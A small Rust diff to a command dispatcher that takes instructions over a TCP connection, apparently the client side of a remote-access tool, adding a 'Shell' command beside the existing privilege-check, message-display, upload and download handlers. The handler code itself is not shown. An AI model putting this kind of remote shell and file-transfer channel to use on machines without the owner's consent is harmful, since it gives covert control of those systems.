@@ -4,6 +4,7 @@ use shared::InstructMessage;
 
 pub mod filesystem;
 pub mod system;
+pub mod shell;
 
 pub fn dispatch(instruct: InstructMessage, conn: &mut TcpStream) -> Result<bool, String> {
     match instruct {
@@ -15,9 +16,12 @@ pub fn dispatch(instruct: InstructMessage, conn: &mut TcpStream) -> Result<bool,
         InstructMessage::Check => system::check_privileges(conn), // check
         InstructMessage::Display(content) => system::display_message(content), // display
 
+        InstructMessage::Shell => shell::run(conn),
+
         // FileSystem
         InstructMessage::Upload => filesystem::upload(conn),
         InstructMessage::Download(path) => filesystem::download(path, conn),
+        
         // No registered command
         // _ => Ok(true)
     }
